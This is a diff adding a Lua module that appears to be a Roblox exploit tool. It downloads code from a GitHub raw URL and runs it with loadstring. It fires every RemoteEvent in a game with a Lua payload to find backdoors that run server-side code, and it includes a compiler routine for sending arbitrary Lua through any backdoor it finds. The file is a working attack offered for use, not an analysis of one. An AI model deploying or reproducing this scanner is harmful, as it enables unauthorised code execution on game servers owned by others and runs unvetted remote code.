@@ -1,0 +1,58 @@
+local baseurl = "https://raw.githubusercontent.com/veryz-sillyz-boyz/ln-scanner/refs/heads/main/"
+
+local lua = loadstring(game:HttpGet(baseurl .. "lua"))()
+local runner = loadstring(game:HttpGet(baseurl .. "runner"))
+local LuaState = {}
+lua.luaX:init()
+api = {}
+
+function api.scannerAPI()
+	local foundBackdoor = nil
+
+	for _, v in pairs(game:GetDescendants()) do
+		if v:IsA("RemoteEvent") then
+			pcall(function()
+				v:FireServer("local a = Instance.new('IntValue'); a.Parent = workspace; a.Name = 'ScannerAPI';")
+			end)
+
+			wait(0.2) 
+
+			local testValue = workspace:FindFirstChild("ScannerAPI")
+			if testValue then
+				foundBackdoor = v
+				testValue:Destroy()
+				break
+			end
+		end
+	end
+
+	if foundBackdoor then
+		return foundBackdoor
+	else
+		return nil
+	end
+end
+
+function api.execute(str)
+	local f, writer, buff;
+	local env = lua.virtualEnv()
+	local ran = pcall(function()
+		local zio = lua.luaZ:init(lua.luaZ:make_getS(str), nil);
+		if not zio then
+			return error();
+		end;		
+		writer, buff = lua.luaU:make_setS();
+		lua.luaU:dump(LuaState, lua.luaY:parser(LuaState, zio, nil, (env and env.script and env.script:GetFullName()) or "@input"), writer, buff);
+		f = runner(buff.data, env);
+	end)
+
+	if ran then
+		return f,buff.data
+	end
+end
+
+function api.highlight(source)
+	return  loadstring(game:HttpGet(baseurl .. "highlight"))(source)
+end
+
+return api
